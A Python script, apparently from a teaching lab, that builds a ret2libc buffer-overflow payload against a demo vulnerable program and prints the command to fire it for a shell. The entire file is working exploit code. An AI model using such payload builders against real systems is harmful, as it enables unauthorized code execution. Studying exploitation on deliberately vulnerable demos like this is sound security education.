#!/usr/bin/env python3
"""
build_payload.py - ret2libc payload builder for the vuln.c demo.

Usage:
    python3 build_payload.py <system_addr> <exit_addr> <binsh_addr>

All three addresses are hex, with or without a leading 0x, as printed by gdb's
`print system` / `print exit` / `find ... "/bin/sh"`.

Example:
    python3 build_payload.py 0xf7dcc8e0 0xf7dbb5b0 0xf7f39de8

This does NOT run the exploit itself - it only builds the payload and prints
the exact subprocess command to run, so you can see precisely what bytes are
being sent before firing it live.
"""
import sys

OFFSET = 76  # bytes of padding from start of buffer to the saved return address
             # (see RUNBOOK.md step 3 for how this was derived for vuln.c)


def to_le_bytes(addr_str: str) -> bytes:
    addr = int(addr_str, 16)
    return addr.to_bytes(4, byteorder="little")


def main():
    if len(sys.argv) != 4:
        print(__doc__)
        sys.exit(1)

    system_addr, exit_addr, binsh_addr = sys.argv[1:4]

    payload = (
        b"A" * OFFSET
        + to_le_bytes(system_addr)
        + to_le_bytes(exit_addr)
        + to_le_bytes(binsh_addr)
    )

    print(f"Offset (padding bytes): {OFFSET}")
    print(f"Total payload length:   {len(payload)} bytes")
    print()
    print("Run this to fire the exploit:")
    print()
    print("python3 -c \"import subprocess; subprocess.run(['./vuln.out', "
          f"{payload!r}])\"")


if __name__ == "__main__":
    main()
